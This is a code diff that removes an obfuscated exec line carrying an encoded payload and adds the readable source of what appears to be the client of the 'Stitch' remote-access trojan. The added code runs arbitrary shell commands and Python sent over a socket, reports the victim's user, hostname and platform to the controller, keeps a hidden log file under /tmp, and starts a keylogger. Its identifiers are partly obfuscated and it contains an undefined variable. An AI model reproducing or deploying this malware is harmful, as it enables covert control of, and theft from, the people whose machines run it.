@@ -1,3 +1,218 @@
-from requirements import *
 
-exec(SEC(INFO("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")))
+import os
+import re
+import sys
+import math
+import socket
+import base64
+import shutil
+import zipfile
+import datetime
+import requests
+from io import StringIO
+import platform
+import threading
+import subprocess
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
+from st_protocol import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
+from st_encryption import *
+from mss import ScreenshotError
+from time import strftime, sleep
+from contextlib import contextmanager
+
+import pexpect
+import pyxhook
+import pexpect.pxssh
+from mss.linux import MSS
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
+from st_lnx_keylogger import *
+
+
+
+sp = subprocess
+N = True
+T = False
+D = send
+Q = sys.platform
+
+def run_command(GTVX):
+    subp = sp.Popen(GTVX,shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
+    NWA, YPNP = subp.communicate()
+    if not YPNP:
+        if NWA == '':
+            return "[+] Command successfully executed.\n"
+        else:
+            return NWA
+    return "[!] {}".format(YPNP)
+
+def start_command(command):
+    try:
+        subp = sp.Popen(command, shell=True,
+             stdin=None, stdout=None, stderr=None, close_fds=True)
+        return '[+] Command successfully started.\n'
+    except Exception as e:
+        return '[!] {}\n'.format(str(e))
+
+def no_error(LQQ):
+    if LQQ.startswith("ERROR:") or LQQ.startswith("[!]") :
+        return T
+    else:
+        return N
+
+def win_client(system = Q):
+    if system.startswith('win'):
+        return N
+    else:
+        return T
+
+def osx_client(system = Q):
+    if system.startswith('darwin'):
+        return N
+    else:
+        return T
+
+def lnx_client(system = Q):
+    if system.startswith('linux'):
+        return N
+    else:
+        return T
+
+def pyexec(DC,client_socket,pylib=False):
+    pyerror = None
+    response = ''
+    if pylib:
+        try:
+            exec DC
+        except Exception as e:
+            YPNP = "[!] PYEXEC(): {}".format(str(e))
+            D(client_socket,YPNP)
+    else:
+        with stdoutIO() as s:
+            try:
+                exec DC
+            except Exception as e:
+                YPNP = "[!] PYEXEC(): {}".format(str(e))
+                D(client_socket,YPNP)
+        r = s.getvalue()
+        D(client_socket,r)
+
+def determine_cmd(GTVX,YGI):
+    if GTVX.strip()[:6] == "pyexec":
+        pyexec(GTVX.strip()[6:],YGI)
+    elif GTVX.strip()[:5] == "pylib":
+        pyexec(GTVX.strip()[5:],YGI,pylib=True)
+    else:
+        output=run_command(GTVX)
+        D(YGI,output)
+
+def get_user():
+    if win_client():
+        user = os.getenv('username')
+    else:
+        user = run_command('whoami')
+    return user.strip()
+
+def get_path():
+    user = get_user()
+    hostname = platform.node()
+    current_dir = os.getcwd()
+    path_name = "[{}@{}] {}>".format(user,hostname,current_dir)
+    return path_name
+
+def get_temp():
+    if win_client():
+        temp = "C:\\Windows\\Temp\\"
+    else:
+        temp = "/tmp/"
+    return temp
+
+def get_desktop():
+    user = get_user()
+    if win_client():
+        DTVI = os.path.join(os.getenv('userprofile'),'Desktop')
+    elif osx_client():
+        DTVI = '/Users/{}/Desktop'.format(user)
+        if not os.path.exists(DTVI):
+            logname = run_command('logname')
+            DTVI = '/Users/{}/Desktop'.format(logname.strip())
+    else:
+        DTVI = '/home/{}'.format(user)
+    return DTVI
+
+def stitch_running():
+    R = os.getpid()
+    DTVI = os.path.abspath(sys.argv[0])
+    if DTVI.endswith('.py') or DTVI.endswith('.pyc'):
+        DTVI = 'python.exe'
+    if win_client():
+        DC = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
+    else:
+        DC = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
+    if os.path.exists(DC):
+        with open(DC,'r') as st:
+            data = st.readlines()
+            data[0] = str(data[0]).strip()
+        if data[0] == R:
+            if data[1] == DTVI:
+                return True
+        if win_client():
+            exists_cmd = 'wmic process where "ProcessID={}" get ExecutablePath'.format(data[0])
+        else:
+            exists_cmd = 'ps -p {} -o comm='.format(data[0])
+        running = run_command(exists_cmd)
+        if running:
+            if data[1] in running.strip() or running.strip() in data[1]:
+                return True
+    with open(DC,'w') as st:
+        st.write('{}\n{}'.format(R,DTVI))
+    return False
+
+def zipdir(path, zipn):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            zipn.write(os.path.join(root, file))
+
+@contextmanager
+def stdoutIO(stdout=None):
+    prev = sys.stdout
+    if stdout is None:
+        stdout = StringIO()
+    sys.stdout = stdout
+    yield stdout
+    sys.stdout = prev
+
+def client_handler(YGI):
+    user = get_user()
+    hostname = platform.node()
+    current_dir = os.getcwd()
+    R = get_desktop()
+    if os.path.exists(R):
+        os.chdir(R)
+    try:
+        D(YGI,'c3RpdGNoX3NoZWxs',encryption=False)
+        D(YGI,abbrev, encryption=False)
+        D(YGI,Q)
+        D(YGI,Q)
+        D(YGI,user)
+        D(YGI,hostname)
+        D(YGI,platform.platform())
+        cmd_buffer=""
+        while N:
+            cmd_buffer = receive(YGI)
+            if not cmd_buffer: break
+            if cmd_buffer == "end_connection": break
+            determine_cmd(str(cmd_buffer),YGI)
+        YGI.close()
+    except Exception:
+        if dbg:
+            print(e)
+        YGI.close()
+
+dbg = False
+nt_kl = keylogger()
+script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
+
